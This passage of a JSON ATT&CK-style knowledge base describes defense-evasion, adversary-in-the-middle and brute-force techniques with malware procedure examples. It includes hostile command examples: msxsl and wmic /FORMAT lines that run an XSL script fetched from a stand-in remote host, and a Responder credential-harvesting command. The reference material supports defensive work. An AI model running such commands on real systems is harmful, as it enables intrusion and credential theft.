                "description": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.[1]Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks [2] , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro [3] or waiting for a user to double click on an embedded image to activate.[4]",
                "Procedure": {
                    "G0012": {
                        "ID": "G0012",
                        "Name": "Darkhotel",
                        "Description": "<name> has used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system.[5]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes.[4]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> loader only executes the payload after the left mouse button has been pressed at least three times, in order to avoid being executed within virtualized or emulated environments.[6]"
                    },
                    "S0543": {
                        "ID": "S0543",
                        "Name": "Spark",
                        "Description": "<name> has used a splash screen to check whether an user actively clicks on the screen before running malicious code.[7]"
                    }
                }
            },
            "003": {
                "name": "Time Based Evasion",
                "href": "/techniques/T1497/003",
                "description": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.[1]Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.[2][3] Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).[4][5]Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.[6]",
                "Procedure": {
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> has waited a specified time before downloading a second stage payload.[7]"
                    },
                    "S0642": {
                        "ID": "S0642",
                        "Name": "BADFLICK",
                        "Description": "<name> has delayed communication to the actor-controlled IP address by 5 minutes.[8]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can use a timer to delay execution of core functionality.[9]"
                    },
                    "S0574": {
                        "ID": "S0574",
                        "Name": "BendyBear",
                        "Description": "<name> can check for analysis environments and signs of debugging using the Windows API kernel32!GetTickCountKernel32 call.[10]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> has checked if the malware is running in a virtual environment with the anti-debug function GetTickCount() to compare the timing.[11][12]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> can call NtDelayExecution to pause execution.[13][14]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> has the ability to set a hardcoded and randomized sleep interval.[15]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> can wait 30 minutes before initiating contact with C2.[16]"
                    },
                    "S0611": {
                        "ID": "S0611",
                        "Name": "Clop",
                        "Description": "<name> has used the sleep command to avoid sandbox detection.[17]"
                    },
                    "S0115": {
                        "ID": "S0115",
                        "Name": "Crimson",
                        "Description": "<name> can determine when it has been installed on a host for at least 15 days before downloading the final payload.[18]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> can implement the kernel32.dll Sleep function to delay execution for up to 300 seconds before implementing persistence or processing an addon package.[19]"
                    },
                    "S0694": {
                        "ID": "S0694",
                        "Name": "DRATzarus",
                        "Description": "<name> can use the GetTickCount and GetSystemTimeAsFileTime API calls to measure function timing.[20] <name> can also remotely shut down into sleep mode under specific conditions to evade detection.[20]"
                    },
                    "S0554": {
                        "ID": "S0554",
                        "Name": "Egregor",
                        "Description": "<name> can perform a  long sleep (greater than or equal to 3 minutes) to evade detection.[21]"
                    },
                    "S0396": {
                        "ID": "S0396",
                        "Name": "EvilBunny",
                        "Description": "<name> has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox.[22]"
                    },
                    "S0512": {
                        "ID": "S0512",
                        "Name": "FatDuke",
                        "Description": "<name> can turn itself on or off at random intervals.[23]"
                    },
                    "S0493": {
                        "ID": "S0493",
                        "Name": "GoldenSpy",
                        "Description": "<name>'s installer has delayed installation of <name> for two hours after it reaches a victim system.[24]"
                    },
                    "S0588": {
                        "ID": "S0588",
                        "Name": "GoldMax",
                        "Description": "<name> has set an execution trigger date and time, stored as an ASCII Unix/Epoch time value.[25]"
                    },
                    "S0632": {
                        "ID": "S0632",
                        "Name": "GrimAgent",
                        "Description": "<name> can sleep for 195 - 205 seconds after payload execution and before deleting its task.[26]"
                    },
                    "S0561": {
                        "ID": "S0561",
                        "Name": "GuLoader",
                        "Description": "<name> has the ability to perform anti-debugging based on time checks, API calls, and CPUID.[27]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "<name> has the ability to receive a command parameter to sleep prior to carrying out destructive actions on a targeted host.[28]"
                    },
                    "S0513": {
                        "ID": "S0513",
                        "Name": "LiteDuke",
                        "Description": "<name> can wait 30 seconds before executing additional code if security software is detected.[23]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> has performed a time-based anti-debug check before downloading its third stage.[29]"
                    },
                    "S1059": {
                        "ID": "S1059",
                        "Name": "metaMain",
                        "Description": "<name> has delayed execution for five to six minutes during its persistence establishment process.[30]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name>'s loader can detect presence of an emulator by using two calls to GetTickCount API, and checking whether the time has been accelerated.[31]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group used tools that collected GetTickCount and GetSystemTimeAsFileTime data to detect sandbox or VMware services.[20]"
                    },
                    "S0626": {
                        "ID": "S0626",
                        "Name": "P8RAT",
                        "Description": "<name> has the ability to \"sleep\" for a specified time to evade detection.[32]"
                    },
                    "S0453": {
                        "ID": "S0453",
                        "Name": "Pony",
                        "Description": "<name> has delayed execution using a built-in function to avoid detection and analysis.[33]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "The <name> dropper can delay dropping the payload to evade detection.[34][35]"
                    },
                    "S0565": {
                        "ID": "S0565",
                        "Name": "Raindrop",
                        "Description": "After initial installation, <name> runs a computation to delay execution.[36]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has used the command timeout 20 to pause the execution of its initial loader.[37]"
                    },
                    "S1086": {
                        "ID": "S1086",
                        "Name": "Snip3",
                        "Description": "<name> can execute WScript.Sleep to delay execution of its second stage.[38]"
                    },
                    "S0627": {
                        "ID": "S0627",
                        "Name": "SodaMaster",
                        "Description": "<name> has the ability to put itself to \"sleep\" for a specified time.[32]"
                    },
                    "S1034": {
                        "ID": "S1034",
                        "Name": "StrifeWater",
                        "Description": "<name> can modify its sleep time responses from the default of 20-22 seconds.[39]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> remained dormant after initial access for a period of up to two weeks.[40]"
                    },
                    "S1064": {
                        "ID": "S1064",
                        "Name": "SVCReady",
                        "Description": "<name> can enter a sleep stage for 30 minutes to evade detection.[41]"
                    },
                    "S0595": {
                        "ID": "S0595",
                        "Name": "ThiefQuest",
                        "Description": "<name> invokes time call to check the system's time, executes a sleep command, invokes a second time call, and then compares the time difference between the two time calls and the amount of time the system slept to identify the sandbox.[42]"
                    },
                    "S0671": {
                        "ID": "S0671",
                        "Name": "Tomiris",
                        "Description": "<name> has the ability to sleep for at least nine minutes to evade sandbox-based analysis systems.[43]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> has used printf and file I/O loops to delay process execution as part of API hammering.[5]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> has used a 30 minute delay after execution to evade sandbox monitoring tools.[44]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> can pause for 20 seconds to bypass antivirus solutions.[45][46]"
                    },
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "Using the machine's local time, <name> waits 43200 seconds (12 hours) from the initial creation timestamp of a specific file, .report. After the elapsed time, <name> executes additional modules.[47]"
                    }
                }
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.[1]Adversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.[2]",
        "Procedure": {
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware has the ability to perform anti-sandboxing and anti-virtualization checks.[3]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can attempt to overload sandbox analysis by sending 1550 calls to printf.[4]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware can check to determine if the compromised system is running on VMware.[5]"
            },
            "S1070": {
                "ID": "S1070",
                "Name": "Black Basta",
                "Description": "malware can make a random number of calls to the kernel32.beep function to hinder log analysis.[6]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware has the ability to perform anti-virtualization checks.[7]"
            },
            "S0484": {
                "ID": "S0484",
                "Name": "Carberp",
                "Description": "malware has removed various hooks before installing the trojan or bootkit to evade sandbox analysis or other analysis software.[8]"
            },
            "S0023": {
                "ID": "S0023",
                "Name": "CHOPSTICK",
                "Description": "malware  includes runtime checks to identify an analysis environment and prevent execution on it.[9]"
            },
            "S0046": {
                "ID": "S0046",
                "Name": "CozyCar",
                "Description": "Some versions of malware will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit.[10]"
            },
            "G0012": {
                "ID": "G0012",
                "Name": "Darkhotel",
                "Description": "malware malware has employed just-in-time decryption of strings to evade sandbox detection.[11]"
            },
            "S0554": {
                "ID": "S0554",
                "Name": "Egregor",
                "Description": "malware has used multiple anti-analysis and anti-sandbox techniques to prevent automated analysis by sandboxes.[12][13]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware can use junk code to generate random activity to obscure malware behavior.[14]"
            },
            "S0499": {
                "ID": "S0499",
                "Name": "Hancitor",
                "Description": "malware has used a macro to check that an ActiveDocument shape object in the lure message is present. If this object is not found, the macro will exit without downloading additional payloads.[15]"
            },
            "S1020": {
                "ID": "S1020",
                "Name": "Kevin",
                "Description": "malware can sleep for a time interval between C2 communication attempts.[16]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has embedded a \"vmdetect.exe\" executable to identify virtual machines at the beginning of execution.[17]"
            },
            "C0005": {
                "ID": "C0005",
                "Name": "Operation Spalax",
                "Description": "During malware, the threat actors used droppers that would run anti-analysis checks before executing malware on a compromised host.[18]"
            },
            "S0147": {
                "ID": "S0147",
                "Name": "Pteranodon",
                "Description": "malware has the ability to use anti-detection functions to identify sandbox environments.[19]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware can detect if it is running within a sandbox or other virtualized analysis environment.[20]"
            },
            "S1030": {
                "ID": "S1030",
                "Name": "Squirrelwaffle",
                "Description": "malware has contained a hardcoded list of IP addresses to block that belong to sandboxes and analysis platforms.[21][22]"
            },
            "S0380": {
                "ID": "S0380",
                "Name": "StoneDrill",
                "Description": "malware has used several anti-emulation techniques to prevent automated analysis by emulators or sandboxes.[23]"
            }
        }
    },
    "T1600": {
        "ttp_name": "Weaken Encryption",
        "ttp_id": "T1600",
        "href": "/techniques/T1600",
        "subtechnique": {
            "001": {
                "name": "Reduce Key Space",
                "href": "/techniques/T1600/001",
                "description": "Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.[1]Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.Adversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device. [2]",
                "Procedure": {}
            },
            "002": {
                "name": "Disable Crypto Hardware",
                "href": "/techniques/T1600/002",
                "description": "Adversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of Modify System Image, forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., Reduce Key Space). [1]",
                "Procedure": {}
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. [1]Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as Modify System Image, Reduce Key Space, and Disable Crypto Hardware, an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. [2]",
        "Procedure": {}
    },
    "T1220": {
        "ttp_name": "XSL Script Processing",
        "ttp_id": "T1220",
        "href": "/techniques/T1220",
        "tactic": "Defense Evasion",
        "description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. [1]Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe) [2] can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. [3] Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. [4] Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.[5]Command-line examples:[3][5]msxsl.exe customers[.]xml script[.]xslmsxsl.exe script[.]xsl script[.]xslmsxsl.exe script[.]jpeg script[.]jpegAnother variation of this technique, dubbed \"Squiblytwo\", involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file.[6] This technique can also execute local/remote scripts and, similar to its Regsvr32/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch.[5]Command-line examples:[5][6]Local File: wmic process list /FORMAT:evil[.]xslRemote File: wmic os get /FORMAT:\"https[:]//example[.]com/evil[.]xsl\"",
        "Procedure": {
            "S0373": {
                "ID": "S0373",
                "Name": "Astaroth",
                "Description": "malware executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain. [7]"
            },
            "G0080": {
                "ID": "G0080",
                "Name": "Cobalt Group",
                "Description": "malware used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.[8]"
            },
            "G0126": {
                "ID": "G0126",
                "Name": "Higaisa",
                "Description": "malware used an XSL file to run VBScript code.[9]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "During malware, Lazarus Group used a remote XSL script to download a Base64-encoded DLL custom downloader.[10]"
            }
        }
    },
    "T1557": {
        "ttp_name": "Adversary-in-the-Middle",
        "ttp_id": "T1557",
        "href": "/techniques/T1557",
        "subtechnique": {
            "001": {
                "name": "LLMNR/NBT-NS Poisoning and SMB Relay",
                "href": "/techniques/T1557/001",
                "description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. [1][2]Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.[3][4] Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.\u00a0Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder.[5][6][7]",
                "Procedure": {
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.[8][9]"
                    },
                    "S0357": {
                        "ID": "S0357",
                        "Name": "Impacket",
                        "Description": "<name> modules like ntlmrelayx and smbrelayx can be used in conjunction with Network Sniffing and LLMNR/NBT-NS Poisoning and SMB Relay to gather NetNTLM credentials for Brute Force or relay attacks that can gain code execution.[10]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> executed Responder using the command [Responder file path] -i [IP address] -rPv on a compromised host to harvest credentials and move laterally.[11]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.[12]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can sniff plaintext network credentials and use NBNS Spoofing to poison name services.[13]"
                    },
                    "S0174": {
                        "ID": "S0174",
                        "Name": "Responder",
                        "Description": "<name> is used to poison name services to gather hashes and credentials from systems within a local network.[7]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used the Invoke-Inveigh PowerShell cmdlets, likely for name service poisoning.[14]"
                    }
                }
            },
            "002": {
                "name": "ARP Cache Poisoning",
                "href": "/techniques/T1557/002",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.[1] Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.[2][3]Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.[2]",
                "Procedure": {
                    "G0003": {
                        "ID": "G0003",
                        "Name": "Cleaver",
                        "Description": "<name> has used custom tools to facilitate ARP cache poisoning.[3]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has used ARP spoofing to redirect a compromised machine to an actor-controlled website.[4]"
                    }
                }
            },
            "003": {
                "name": "DHCP Spoofing",
                "href": "/techniques/T1557/003",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.[1] The typical server-client interaction is as follows: The client broadcasts a DISCOVER message.The server responds with an OFFER message, which includes an available network address. The client broadcasts a REQUEST message, which includes the network address offered. The server acknowledges with an ACK message and the client receives the network configuration parameters.Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.[2][3] Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.DHCPv6 clients can receive network configuration information without being assigned an IP address by sending a INFORMATION-REQUEST (code 11) message to the All_DHCP_Relay_Agents_and_Servers multicast address.[4] Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, Service Exhaustion Flood) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool.",
                "Procedure": {}
            }
        },
        "tactic": "Credential Access",
        "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.[1]For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.[2][3][4] Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens (Steal Application Access Token) and session cookies (Steal Web Session Cookie).[5][6] Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.[7][8][9]Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in Transmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to Impair Defenses and/or in support of a Network Denial of Service.",
        "Procedure": {
            "S0281": {
                "ID": "S0281",
                "Name": "Dok",
                "Description": "malware proxies web traffic to potentially monitor and alter victim HTTP(S) traffic.[10][11]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has used modified versions of PHProxy to examine web traffic between the victim and the accessed website.[12]"
            }
        }
    },
    "T1110": {
        "ttp_name": "Brute Force",
        "ttp_id": "T1110",
        "href": "/techniques/T1110",
        "subtechnique": {
            "001": {
                "name": "Password Guessing",
                "href": "/techniques/T1110/001",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. [1]Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:SSH (22/TCP)Telnet (23/TCP)FTP (21/TCP)NetBIOS / SMB / Samba (139/TCP & 445/TCP)LDAP (389/TCP)Kerberos (88/TCP)RDP / Terminal Services (3389/TCP)HTTP/HTTP Management Services (80/TCP & 443/TCP)MSSQL (1433/TCP)Oracle (1521/TCP)MySQL (3306/TCP)VNC (5900/TCP)SNMP (161/UDP and 162/TCP/UDP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.[2]. Further, adversaries may abuse network device interfaces (such as wlanAPI) to brute force accessible wifi-router(s) via wireless authentication protocols.[3]In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days.[4] <name> has also used a Kubernetes cluster to conduct distributed, large-scale password guessing attacks.[5]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has successfully conducted password guessing attacks against a list of mailboxes.[6]"
                    },
                    "S0020": {
                        "ID": "S0020",
                        "Name": "China Chopper",
                        "Description": "<name>'s server component can perform brute force password guessing against authentication portals.[7]"
                    },
                    "S0488": {
                        "ID": "S0488",
                        "Name": "CrackMapExec",
                        "Description": "<name> can brute force passwords for a specified user on a single target system or across an entire network.[8]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has been observed using a hard coded list of passwords to brute force user accounts. [9][10][11][12][13][14]"
                    },
                    "S0698": {
                        "ID": "S0698",
                        "Name": "HermeticWizard",
                        "Description": "<name> can use a list of hardcoded credentials in attempt to authenticate to SMB shares.[15]"
                    },
                    "S0532": {
                        "ID": "S0532",
                        "Name": "Lucifer",
                        "Description": "<name> has attempted to brute force TCP ports 135 (RPC) and 1433 (MSSQL) with the default username or list of usernames and    passwords.[16]"
                    },
                    "S0598": {
                        "ID": "S0598",
                        "Name": "P.A.S. Webshell",
                        "Description": "<name> can use predefined users and passwords to execute brute force attacks against SSH, FTP, POP3, MySQL, MSSQL, and PostgreSQL services.[17]"
                    },
                    "S0453": {
                        "ID": "S0453",
                        "Name": "Pony",
                        "Description": "<name> has used a small dictionary of common passwords against a collected list of local accounts.[18]"
                    },
                    "S0374": {
                        "ID": "S0374",
                        "Name": "SpeakUp",
                        "Description": "<name> can perform brute forcing using a pre-defined list of usernames and passwords in an attempt to log in to administrative panels. [19]"
                    },
                    "S0341": {
                        "ID": "S0341",
                        "Name": "Xbash",
                        "Description": "<name> can obtain a list of weak passwords from the C2 server to use for brute forcing as well as attempt to brute force services with open ports.[20][21]"
                    }
                }
            },
            "002": {
                "name": "Password Cracking",
                "href": "/techniques/T1110/002",
                "description": "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. OS Credential Dumping can be used to obtain password hashes, this may only get an adversary so far when Pass the Hash is not an option. Further,  adversaries may leverage Data from Configuration Repository in order to obtain hashed credentials for network devices.[1] Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.[2] The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",
                "Procedure": {
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has been known to brute force password hashes to be able to leverage plain text credentials.[3]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> performed password brute-force attacks on the local admin account.[4]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has dropped and executed tools used for password cracking, including Hydra and CrackMapExec.[5][6]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has extracted password hashes from ntds.dit to crack offline.[7]"
                    },
                    "S0056": {
                        "ID": "S0056",
                        "Name": "Net Crawler",
                        "Description": "<name> uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network.[8]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors used Cain & Abel to crack password hashes.[9]"
                    }
                }
            },
            "003": {
                "name": "Password Spraying",
